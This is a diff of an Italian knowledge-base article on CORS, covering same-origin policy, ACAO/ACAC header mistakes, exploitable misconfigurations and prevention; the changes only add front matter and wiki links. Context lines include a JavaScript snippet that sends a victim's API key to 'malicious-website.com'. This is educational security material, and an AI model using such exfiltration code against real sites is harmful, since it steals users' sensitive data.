@@ -1,6 +1,10 @@
+---
+aliases: [CORS, Cross-origin resource sharing]
+tags: [cyber-offence-and-defence]
+---
 La cross-origin resource sharing (CORS) è un meccanismo del browser che consente l'accesso controllato alle risorse situate al di fuori di un dato dominio. Estende e aggiunge flessibilità alla politica di origine (SOP). Tuttavia, fornisce anche il potenziale per attacchi tra domini, se la politica CORS di un sito web è configurata e implementata male. CORS non è una protezione contro attacchi tra origini come la falsificazione di richieste tra siti (CSRF).
 ## Same-origin policy (SOP)
-La same-origin policy è un meccanismo di sicurezza del browser web che mira a impedire ai siti web di attaccarsi a vicenda. La same-origin policy impedisce agli script su un'origine di accedere ai dati da un'altra origine. Un'origine è composta da uno schema URI, dominio e numero di porta. Ad esempio, considera il seguente URL:
+La same-origin policy è un meccanismo di [[Sicurezza|sicurezza]] del browser web che mira a impedire ai siti web di attaccarsi a vicenda. La same-origin policy impedisce agli script su un'origine di accedere ai dati da un'altra origine. Un'origine è composta da uno schema URI, dominio e numero di porta. Ad esempio, considera il seguente URL:
 `http://normal-website.com/example/example.html`
 
 Questo utilizza lo schema `http`, il dominio `normal-website.com` e il numero di porta `80`. La seguente lista mostra come verrà applicata la politica della stessa origine se il contenuto all'URL sopra riportato tenta di accedere ad altre origini:
@@ -19,7 +23,7 @@ Il protocollo di cross-origin resource sharing utilizza una serie di intestazion
 
 Immaginiamo di voler accedere a un’API REST da un dominio diverso rispetto al nostro, con un’interazione front-end-to-backend. L’idea è che il nostro sito web (che ospita il front-end) richieda informazioni a un server che fornisce l’API REST. Questo server sarà il nostro backend.
 
-Quando il front-end effettua una richiesta a un endpoint dell’API, il server risponde generalmente con un JSON contenente i dati richiesti. Tuttavia, quando il browser prova a leggere questa risposta JSON, potrebbe verificarsi un problema legato alla same-origin policy (SOP). Questa politica è una misura di sicurezza che impedisce di accedere a risorse provenienti da domini diversi rispetto a quello del sito attuale. Se la richiesta è “cross-origin” (cioè proveniente da un dominio diverso), il browser potrebbe bloccare l’accesso alla risposta, rendendo il contenuto “opaco”. In pratica, sarà possibile accedere solo al codice di stato (es. 200 OK), ma non al contenuto della risposta.
+Quando il front-end effettua una richiesta a un endpoint dell’API, il server risponde generalmente con un JSON contenente i dati richiesti. Tuttavia, quando il browser prova a leggere questa risposta JSON, potrebbe verificarsi un problema legato alla same-origin policy (SOP). Questa politica è una misura di [[Sicurezza|sicurezza]] che impedisce di accedere a risorse provenienti da domini diversi rispetto a quello del sito attuale. Se la richiesta è “cross-origin” (cioè proveniente da un dominio diverso), il browser potrebbe bloccare l’accesso alla risposta, rendendo il contenuto “opaco”. In pratica, sarà possibile accedere solo al codice di stato (es. 200 OK), ma non al contenuto della risposta.
 
 Per superare questa restrizione in modo controllato, si utilizza il meccanismo CORS (Cross-Origin Resource Sharing). Il server, infatti, può configurare i suoi header per consentire richieste da domini specifici. Quando il browser effettua una richiesta cross-origin, aggiunge automaticamente un header chiamato `Origin`, che indica il dominio da cui proviene la richiesta (es. `example.com`). Il server, a sua volta, verifica se il dominio indicato è nella sua lista di domini consentiti (whitelist). Se lo è, il server include nella risposta un header chiamato `Access-Control-Allow-Origin` con il dominio approvato. Questo comunica al browser che può elaborare e rendere accessibile il contenuto della risposta. Se invece il dominio non è autorizzato, il server può decidere di non rispondere affatto o di inviare una risposta che il browser non potrà utilizzare. In questo modo, il server protegge le sue risorse da accessi non autorizzati.
 
@@ -27,25 +31,25 @@ Va notato che questo tipo di protezione è specifico per i browser. Se si utiliz
 
 Quindi, il meccanismo CORS è una protezione per gli utenti che accedono al web tramite browser, per evitare che le loro sessioni attive con un dominio possano essere utilizzate da siti non autorizzati. Tuttavia, non è pensato per proteggere l’API REST da accessi non autenticati al di fuori del browser.
 ## Errori frequenti su ACAC e ACAO
-Un aspetto importante da considerare quando si lavora con le API e la sicurezza delle richieste è l’header **Access-Control-Allow-Credentials**. Il suo unico valore possibile è `true`. Tuttavia, bisogna usarlo con cautela, perché aggiungerlo indiscriminatamente può abbassare il livello di protezione.
+Un aspetto importante da considerare quando si lavora con le API e la [[Sicurezza|sicurezza]] delle richieste è l’header **Access-Control-Allow-Credentials**. Il suo unico valore possibile è `true`. Tuttavia, bisogna usarlo con cautela, perché aggiungerlo indiscriminatamente può abbassare il livello di protezione.
 
 Questo header è rilevante solo se la richiesta include credenziali come cookie, intestazioni di autenticazione o altri dati sensibili. Se una richiesta non include queste credenziali, non è necessario aggiungere `Access-Control-Allow-Credentials: true` nella risposta. Infatti, in questi casi, l’endpoint è considerato pubblico, e i dati forniti non sono legati a un utente specifico.
 
 **Quando utilizzare Access-Control-Allow-Credentials?** Se un endpoint richiede credenziali, come un cookie di sessione, il server deve includere questo header nella risposta per permettere al browser di elaborarla. Senza di esso, il browser bloccherà l’accesso alla risposta, anche se la richiesta è valida. Questo accade perché il server e il browser devono essere allineati nell’uso delle credenziali.
 
-**Rischi nell’uso scorretto** Se si aggiunge questo header senza motivo, specialmente su endpoint che non richiedono autenticazione, si riduce il livello di sicurezza. Ad esempio, un endpoint che riflette semplicemente qualsiasi valore ricevuto nell’header `Origin` è molto rischioso. Riflettere automaticamente l’origin significa consentire accessi da qualsiasi dominio, rendendo l’endpoint potenzialmente vulnerabile.
+**Rischi nell’uso scorretto** Se si aggiunge questo header senza motivo, specialmente su endpoint che non richiedono autenticazione, si riduce il livello di [[Sicurezza|sicurezza]]. Ad esempio, un endpoint che riflette semplicemente qualsiasi valore ricevuto nell’header `Origin` è molto rischioso. Riflettere automaticamente l’origin significa consentire accessi da qualsiasi dominio, rendendo l’endpoint potenzialmente vulnerabile.
 
 Una buona pratica è usare una lista di domini consentiti (allow list). Se l’API è destinata a essere utilizzata solo da domini specifici (es. `example.com`), il server dovrebbe controllare che l’header `Origin` corrisponda a uno di questi domini e rispondere di conseguenza.
 
 Possono accadere situazioni particolari:
 - **wild card `*` nell’header Access-Control-Allow-Origin:** questo indica che qualsiasi dominio può accedere all’endpoint. È utile per API pubbliche, come quelle di Google Maps, ma non è compatibile con `Access-Control-Allow-Credentials: true`. Questo perché non è possibile autorizzare credenziali da un dominio generico.
-- **origine null:** l’origine `null` può verificarsi in contesti particolari, ad esempio quando si caricano risorse tramite schemi `data:` o da iframe con restrizioni di sicurezza. In questi casi, l’origine non è definita, e la gestione deve essere fatta con attenzione per evitare problemi di sicurezza.
+- **origine null:** l’origine `null` può verificarsi in contesti particolari, ad esempio quando si caricano risorse tramite schemi `data:` o da iframe con restrizioni di [[Sicurezza|sicurezza]]. In questi casi, l’origine non è definita, e la gestione deve essere fatta con attenzione per evitare problemi di [[Sicurezza|sicurezza]].
 
 Alcuni consigli pratici per evitare gli errori comuni sono:
 - usa `Access-Control-Allow-Credentials: true` solo se necessario, ovvero quando l’endpoint richiede credenziali;
 - evita di riflettere automaticamente l’header `Origin`. Preferisci una lista di domini consentiti;
 - per endpoint pubblici, considera l’uso della wild card `*` nell’header `Access-Control-Allow-Origin`, ma solo se non richiedi credenziali;
-- controlla sempre che le configurazioni CORS siano coerenti con i requisiti di sicurezza della tua applicazione.
+- controlla sempre che le configurazioni CORS siano coerenti con i requisiti di [[Sicurezza|sicurezza]] della tua applicazione.
 ## Vulnerabilità derivanti da problemi di configurazione CORS
 Molti siti web moderni usano CORS per consentire l'accesso da sottodomini e terze parti fidate. La loro implementazione di CORS potrebbe contenere errori o essere eccessivamente indulgente per garantire che tutto funzioni, e questo può causare vulnerabilità sfruttabili.
 ### Intestazione ACAO generata dal server dall'intestazione Origin specificata dal client
@@ -93,7 +97,7 @@ HTTP/1.1 200 OK
 Access-Control-Allow-Origin: https://innocent-website.com
 ```
 
-Spesso si verificano errori quando si implementano le whitelist di origine CORS. Alcune organizzazioni decidono di consentire l'accesso da tutti i loro sottodomini (inclusi i futuri sottodomini non ancora esistenti). E alcune applicazioni consentono l'accesso da vari domini di altre organizzazioni, inclusi i loro sottodomini. Queste regole vengono spesso implementate abbinando prefissi o suffissi URL o utilizzando espressioni regolari. Qualsiasi errore nell'implementazione può portare alla concessione dell'accesso a domini esterni non intenzionali.
+Spesso si verificano errori quando si implementano le whitelist di origine CORS. Alcune organizzazioni decidono di consentire l'accesso da tutti i loro sottodomini (inclusi i futuri sottodomini non ancora esistenti). E alcune applicazioni consentono l'accesso da vari domini di altre organizzazioni, inclusi i loro sottodomini. Queste regole vengono spesso implementate abbinando prefissi o suffissi URL o utilizzando [[Espressioni regolari|espressioni regolari]]. Qualsiasi errore nell'implementazione può portare alla concessione dell'accesso a domini esterni non intenzionali.
 
 Ad esempio, supponiamo che un'applicazione conceda l'accesso a tutti i domini che terminano con:
 `normal-website.com`
@@ -139,7 +143,7 @@ location='malicious-website.com/log?key='+this.responseText;
 ```
 
 ### Sfruttare XSS tramite relazioni di fiducia CORS
-Anche CORS configurato "correttamente" stabilisce un rapporto di fiducia tra due origini. Se un sito web si fida di un'origine vulnerabile al cross-site scripting (XSS), un aggressore potrebbe sfruttare l'XSS per iniettare del codice JavaScript che usa CORS per recuperare informazioni sensibili dal sito che si fida dell'applicazione vulnerabile.
+Anche CORS configurato "correttamente" stabilisce un rapporto di fiducia tra due origini. Se un sito web si fida di un'origine vulnerabile al cross-site scripting (XSS), un aggressore potrebbe sfruttare l'XSS per iniettare del codice [[JavaScript]] che usa CORS per recuperare informazioni sensibili dal sito che si fida dell'applicazione vulnerabile.
 
 Data la seguente richiesta:
 ```http
@@ -194,7 +198,7 @@ La maggior parte degli attacchi CORS si basa sulla presenza dell'intestazione di
 `Access-Control-Allow-Credentials: true`
 Senza tale intestazione, il browser dell'utente vittima rifiuterà di inviare i cookie, il che significa che l'aggressore otterrà accesso solo a contenuti non autenticati, a cui potrebbe accedere facilmente navigando direttamente sul sito web di destinazione.
 
-Tuttavia, esiste una situazione comune in cui un aggressore non può accedere direttamente a un sito web: quando fa parte dell'intranet di un'organizzazione e si trova all'interno dello spazio di indirizzi IP privati. I siti web interni sono spesso tenuti a uno standard di sicurezza inferiore rispetto ai siti esterni, consentendo agli aggressori di trovare vulnerabilità e ottenere ulteriore accesso. Ad esempio, una richiesta cross-origin all'interno di una rete privata potrebbe essere la seguente:
+Tuttavia, esiste una situazione comune in cui un aggressore non può accedere direttamente a un sito web: quando fa parte dell'intranet di un'organizzazione e si trova all'interno dello spazio di indirizzi IP privati. I siti web interni sono spesso tenuti a uno standard di [[Sicurezza|sicurezza]] inferiore rispetto ai siti esterni, consentendo agli aggressori di trovare vulnerabilità e ottenere ulteriore accesso. Ad esempio, una richiesta cross-origin all'interno di una rete privata potrebbe essere la seguente:
 ```http
 GET /reader?url=doc1.pdf
 Host: intranet.normal-website.com
@@ -211,5 +215,5 @@ Le vulnerabilità CORS si presentano principalmente come configurazioni errate. 
 - **configurazione corretta delle richieste cross-origin:** se una risorsa web contiene informazioni sensibili, l'origine deve essere specificata correttamente nell'intestazione `Access-Control-Allow-Origin`;
 - **consenti solo siti attendibili:** può sembrare ovvio, ma le origini specificate nell'intestazione `Access-Control-Allow-Origin` devono essere solo siti attendibili. In particolare, riflettere dinamicamente le origini da richieste cross-origin senza convalida è facilmente sfruttabile e dovrebbe essere evitato;
 - **evita di inserire nella whitelist null:** evita di utilizzare l'intestazione `Access-Control-Allow-Origin: null`. Le chiamate di risorse cross-origin da documenti interni e richieste sandbox possono specificare l'origine `null`. Le intestazioni CORS devono essere definite correttamente rispetto alle origini attendibili per server privati e pubblici;
-- **evita i caratteri jolly nelle reti interne:** affidarsi alla sola configurazione di rete per proteggere le risorse interne non è sufficiente quando i browser interni possono accedere a domini esterni non attendibili;
-- **CORS non sostituisce le policy di sicurezza lato server:** CORS definisce i comportamenti del browser e non sostituisce mai la protezione lato server dei dati sensibili. Un aggressore può falsificare direttamente una richiesta da qualsiasi origine attendibile. Pertanto, i server web dovrebbero continuare ad applicare protezioni sui dati sensibili, come l'autenticazione e la gestione delle sessioni, oltre a CORS correttamente configurato.
+- **evita i caratteri jolly nelle [[Reti|reti]] interne:** affidarsi alla sola configurazione di rete per proteggere le risorse interne non è sufficiente quando i browser interni possono accedere a domini esterni non attendibili;
+- **CORS non sostituisce le policy di [[Sicurezza|sicurezza]] lato server:** CORS definisce i comportamenti del browser e non sostituisce mai la protezione lato server dei dati sensibili. Un aggressore può falsificare direttamente una richiesta da qualsiasi origine attendibile. Pertanto, i server web dovrebbero continuare ad applicare protezioni sui dati sensibili, come l'autenticazione e la gestione delle sessioni, oltre a CORS correttamente configurato.
